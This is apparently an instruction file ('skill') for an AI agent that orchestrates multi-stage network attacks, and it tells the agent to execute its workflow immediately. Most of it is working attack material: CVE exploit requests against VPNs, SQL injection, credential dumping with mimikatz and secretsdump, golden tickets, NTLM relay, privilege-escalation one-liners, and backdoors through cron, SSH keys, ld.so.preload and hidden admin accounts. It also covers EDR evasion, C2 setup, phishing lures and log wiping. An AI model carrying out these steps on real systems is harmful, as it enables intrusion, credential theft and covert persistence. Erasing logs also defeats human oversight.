---
name: red-attack-chain
description: Multi-stage attack path planning and execution across complex network environments.
domain: red
category: c2-operations
hide: true
license: MIT
metadata:
  manifest_entry: src/corpus/red-attack-chain/SKILL.md
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (Execute immediately upon reading)

1. `NOW`: Read `skill://red-attack-chain/support/field-journal/precedent-pentest.md` — confirm that this skill's operations are authorized routine operations.
2. `NOW`: **Create/update the case** (`skill://red-attack-chain/support/templates/case-init.sh`) and complete `scope.md` (`skill://red-attack-chain/support/ops/scope-contract.md`); ACT is forbidden while `auth.status!=granted`.
3. `NOW`: Plan the phases in the **lead** role (`skill://red-attack-chain/support/ops/role-map.md`) and write them into specialist_roles.
4. `NEXT`: Read `tool-index.md` to verify tool availability and actual paths.
5. `NEXT`: Invoke bootstrap when tools are missing; do not guess paths.
6. `ACT`: Pass each phase gate per `skill://red-attack-chain/references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` at every phase (`skill://red-attack-chain/support/ops/timeline-workitem.md`); promote discoveries to Evidence/Finding.
7. Wrap-up: the `docs-generator` report must contain the Evidence chain.

> Overall commander for multi-stage attack path planning and execution. When a task requires a complete chain "from A to B," this Skill orchestrates each phase, coordinates sub-skills, and plans attack paths.
> This is not "red-team only" — any penetration scenario requiring cross-phase composition starts here.

---

## When to Route to This Skill

The following scenarios **must** first go through this Skill for full-chain planning, then be dispatched to specific sub-skills for execution:

| Scenario | Why orchestration is needed |
|------|--------------|
| "Run a complete penetration test for me" | Requires planning the whole flow from information gathering to reporting |
| "Pivot from the external network to the domain controller" | Spans multiple phases: perimeter breach → privilege escalation → lateral movement → AD |
| "HW attack-defense exercise" | Requires a complete attack chain + stealth + trace cleanup |
| "Assess this target's attack surface" | Requires multi-dimensional information gathering + path planning |
| "I have a webshell — what's next?" | Requires planning follow-on paths from the current foothold |
| "Help me plan an attack path" | Explicitly requires path orchestration |
| "How far can I get from this vulnerability?" | Requires evaluating the vulnerability's value in a chained exploit |
| "Bug Bounty continuous monitoring" | Requires automating a multi-stage workflow |
| "End-to-end internal network penetration" | Combination of lateral movement + privilege escalation + domain attacks |
| "Close-access penetration plan" | Combination of physical access + internal network penetration |
| "Supply chain attack path" | Cross-organization, multi-hop attack |
| "Phishing + post-exploitation" | Combination of initial access + follow-on exploitation |

**Single-phase tasks do not need to go through this Skill**:
- Port scanning only → go straight to `pentest-tools/`
- SQL injection only → go straight to `pentest-tools/`
- APK reversing only → go straight to `apk-reverse/`
- Domain penetration only → go straight to `arsenal skill_load red-windows-ad`

---

## Orchestration Principles

### Role of This Skill

```
User submits a multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ plan attack paths, determine phase order
    ↓ assess the tools and methods needed for each phase
    ↓
Dispatch to specific sub-skills for execution:
    ├── pentest-tools/     → tool invocation, exploitation
    ├── apk-reverse/       → mobile penetration
    ├── js-reverse/        → web front-end breach
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reversing
    └── browser-automation/ → automated operations
    ↓
After each phase, return to this Skill to assess the next step
    ↓
All phases complete → docs-generator produces the report
```

### Path Planning Decision Tree

```
Once you have the target:
1. What is the target? (Web / internal network / cloud / mobile / IoT)
2. What do you have now? (external view / existing credentials / existing foothold)
3. What is the end goal? (domain controller / data / specific system / proving impact)
4. What are the constraints? (time / stealth / off-limits systems)
    ↓
Plan the shortest path based on the above
    ↓
If one path is blocked → return to this Skill and plan an alternative path
```

---

## Full Attack Chain Phases

---

## 1. Reconnaissance Phase

### 1.1 Enterprise Digital Asset Mapping

```bash
# Discover domains associated with subsidiaries
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness probing
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scanning (all ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Field notes**:
- Use Qichacha/Tianyancha (corporate registries) to obtain subsidiary lists and expand the attack surface
- Watch for test environments (test., dev., staging.) and newly deployed systems
- Use certificate transparency logs (crt.sh) to discover hidden domains

### 1.2 Sensitive Information Leak Hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys inside JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud service AK/SK credentials (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT secrets
- Internal API documentation
- VPN/bastion host credentials

### 1.3 Employee Profiling

**Social-engineering password dictionary generation rules**:
```
{name pinyin}{year}        → zhangsan2024
{name initials}{dept abbr} → zs_dev
{employee id}@{domain}     → 10086@target.com
{name}{common suffix}      → zhangsan@123, zhangsan!@#
```

**Information sources**:
- Maimai/LinkedIn department structure
- Corporate WeChat accounts / official website team pages
- Job postings (tech stack exposure)
- Academic papers (email exposure)

### 1.4 Technology Stack Fingerprinting

```bash
# Web fingerprinting
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Specific framework probing
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## 2. Perimeter Breach Phase (Initial Access)

### 2.1 Web Exploitation (High-Frequency Breach Point)

| Vulnerability type | Detection tool | Exploitation method |
|---------|---------|---------|
| SQL injection | sqlmap | Data extraction → write shell → OS commands |
| SSTI | sstimap | Template injection → RCE |
| File upload | Manual + Burp | Webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Internal network probing → cloud metadata → AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Admin session hijacking |

```bash
# Automated SQL injection
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Batch Nuclei scanning
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply Chain Attacks

**Attack path**:
1. Identify the third-party components/providers the target uses
2. Compromise the vendor to obtain code-signing / update-push privileges
3. Deliver the malicious payload through the legitimate update channel

**Common entry points**:
- Open-source component poisoning (npm/pip/maven)
- SaaS provider API abuse
- Abuse of outsourced-contractor privileges
- Lateral movement through a shared IT service provider

### 2.3 Phishing Attacks

**Email phishing**:
```
Subject templates:
- [Urgent] Your VPN certificate is about to expire — update immediately
- [IT Notice] Your mailbox is running out of space — please clean it up
- [HR] Query your 2024 annual performance review results
- [Finance] Expense system upgraded — please log in again to confirm
```

**Payload types**:
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (disguised as PDFs)
- HTML smuggling
- ISO/IMG images (bypass MOTW)
- OneNote embedded scripts

**OAuth phishing** (emerging trend in 2025):
- Build a malicious OAuth app that requests permissions
- Once the user authorizes, gain mailbox/file access
- No password needed — bypasses MFA

### 2.4 Close-Access Penetration (Physical Access)

| Technique | Tool | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard injection → reverse shell |
| Malicious power bank | O.MG Cable | Data cable disguised to implant a backdoor |
| WiFi phishing | Fluxion / WiFi Pineapple | Rogue access point → credential capture |
| RFID cloning | Proxmark3 | Access card cloning → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Persistent internal network access point |

```bash
# Fluxion WiFi phishing
fluxion  # Interactively select the target AP → create a rogue AP → capture the WPA password

# BadUSB coupled with Cobalt Strike
# Inject a PowerShell downloader via USB → check in to C2
```

### 2.5 VPN / Remote Access Breach

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# General: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud Service Breach

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use MSOLSpray / Spray tools
```

---

## 3. Privilege Escalation Phase

### 3.1 Windows Privilege Escalation

| Technique | Condition | Tool |
|------|------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel exploits | Unpatched | watson / wesng detection |
| Service path hijacking | Unquoted service path | PowerUp |
| DLL hijacking | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry configuration | msiexec installing a malicious MSI |
| Scheduled tasks | Writable task script | Replace via schtasks |

```powershell
# Check for SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privilege escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux Privilege Escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Commonly exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim privilege escalation
sudo vim -c ':!/bin/bash'

# sudo find privilege escalation
sudo find / -exec /bin/bash \;

# Kernel exploits
uname -r  # check the version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database Privilege Escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privilege escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud Privilege Escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → administrator privileges

# Azure AD
# Global administrator → control over all subscriptions
# Application administrator → add credentials to a service principal
```

---

## 4. Lateral Movement Phase

### 4.1 Credential Acquisition

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealthy Lateral Movement Techniques

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves traces)
psexec.py domain/admin:password@target_ip

# SSH tunneling (Linux environments)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # port forwarding
```

### 4.4 NTLM Relay

```bash
# Turn off Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder to capture
responder -I eth0

# NTLM relay to the target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD Attack Paths

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → target user → reset password
# 2. User → WriteDacl → target OU → add privileges
# 3. Computer → constrained delegation → impersonate any user
# 4. User → DCSync rights → dump all hashes

# Certipy AD CS attacks
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 5. Persistence Phase

### 5.1 Windows Persistence

| Technique | Stealth | Detection difficulty |
|------|:---:|:---:|
| Scheduled tasks | Medium | Low |
| Registry Run keys | Low | Low |
| WMI event subscription | High | High |
| DLL hijacking | High | Medium |
| Shadow accounts | Medium | Medium |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (high stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify the registry F value to clone the RID
```

### 5.2 Linux Persistence

```bash
# SSH key implantation
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Patch pam_unix.so to add a universal password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud Environment Persistence

```bash
# AWS Lambda backdoor
# Create a scheduled Lambda function that calls back to C2

# Azure AD app registration
# Create an app → add a key credential → grant Graph API permissions

# Container backdoor
# Modify the base image → every new container ships with the backdoor
```

---

## 6. EDR/AV Bypass (Evasion)

### 6.1 Core Bypass Concepts

| Layer | Technique | Notes |
|------|------|------|
| Static detection | Encryption/obfuscation/custom loaders | Avoid signature matching |
| Behavioral detection | Indirect syscalls/Unhooking | Bypass API hooks |
| Memory detection | Module stomping/heap encryption | Avoid memory scans |
| Network detection | Domain fronting/legitimate service tunneling | Blend into normal traffic |
| Logging detection | ETW patching/log clearing | Reduce traces |

### 6.2 Practical Bypass Techniques

```
1. Custom shellcode loaders (avoid public tools)
2. Direct syscalls (bypass ntdll hooks)
3. Choose low-monitoring processes for injection (e.g., RuntimeBroker.exe)
4. Route C2 traffic over HTTPS + domain fronting / Cloudflare Workers
5. Execute in memory, never touch disk (fileless)
6. Load via legitimately signed binaries (LOLBins)
```

### 6.3 C2 Framework Selection

| Framework | Characteristics | Use case |
|------|------|---------|
| Cobalt Strike | Mature and stable, team collaboration | Large-scale red team operations |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modern, modular | Customization needed |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Included in Kali 2026.1 | Rapid deployment |

---

## 7. Trace Cleanup (Anti-Forensics)

```bash
# Windows log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp modification
touch -t 202301010000 /path/to/file

# Memory cleanup
# Ensure the Mimikatz dump has been deleted
# Ensure the C2 beacon has exited
# Ensure temporary files have been removed
```

---

## Iron Rules of Red Team Operations

### Three Bottom Lines

1. **All operations must have written authorization**
2. **Exfiltrated data must be anonymized**
3. **Clean up all attack traces (including memory residency)**

### Operational Discipline

- Assess the risk level before every action (low/medium/high/critical)
- Notify the project manager before high-risk operations
- Maintain an operations log (time, action, result)
- Report critical vulnerabilities immediately; do not escalate exploitation
- Do not affect business availability (no DoS)
- Do not access/download real user data

### Typical Failure Cases

| Cause of failure | Consequence | Lesson |
|---------|------|------|
| Did not clear the Mimikatz memory dump | Blue team reconstructed the full attack path | Clean up immediately after the operation |
| C2 domain flagged by threat intelligence | Blocked on the very first connection | Use newly registered domains + domain fronting |
| Phishing email triggered a DLP alert | Blue team was alerted in advance | Test the email gateway rules first |
| Lateral movement triggered a honeypot | Exposed the attack intent | Identify honeypots before acting |

---

## Tool Quick Reference

### Reconnaissance
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege Escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral Movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 Frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Close-Access Penetration
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship to Other Skills in This Package

| Need | Route to |
|------|--------|
| In-depth web vulnerability exploitation | `arsenal skill_load webapp-pentest-tools` |
| Detailed internal AD attack steps | `arsenal skill_load red-windows-ad` |
| Reverse-engineering malware samples | `arsenal skill_load re-reverse-engineering` |
| APK reversing (mobile penetration) | `arsenal skill_load re-apk-reverse` |
| JS front-end signature bypass | `arsenal skill_load webapp-js-reverse` |
| Automated swarm penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report Generation | `arsenal skill_load re-docs-generator` |
| Attack path diagrams | `arsenal skill_load re-diagram-generator` |


## Task Completion Self-Check (MUST pass before claiming completion)

- [ ] Did I execute each step in the workflow (rather than only reading)?
- [ ] Did I use verified tool paths based on `tool-index`?
- [ ] Did I produce reproducible evidence (commands/templates/screenshots/reports)?
- [ ] Did I complete and verify the Checklist items required by RULES?
